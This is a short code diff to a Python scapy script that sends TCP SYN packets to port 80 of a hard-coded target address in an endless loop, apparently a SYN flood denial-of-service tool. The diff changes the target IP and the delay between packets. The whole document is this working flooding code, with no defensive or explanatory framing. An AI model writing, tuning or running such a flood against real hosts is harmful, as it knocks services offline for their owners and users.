@@ -2,7 +2,7 @@ from scapy.all import *
 import random
 import time
 
-target_ip = "192.168.64.107" 
+target_ip = "172.19.201.25" 
 target_port = 80
 
 while True:
@@ -10,4 +10,4 @@ while True:
     tcp = TCP(sport=80, dport=target_port, flags="S")
     pkt = ip / tcp
     send(pkt, verbose=0)
-    time.sleep(0.005) 
+    time.sleep(0.01) 
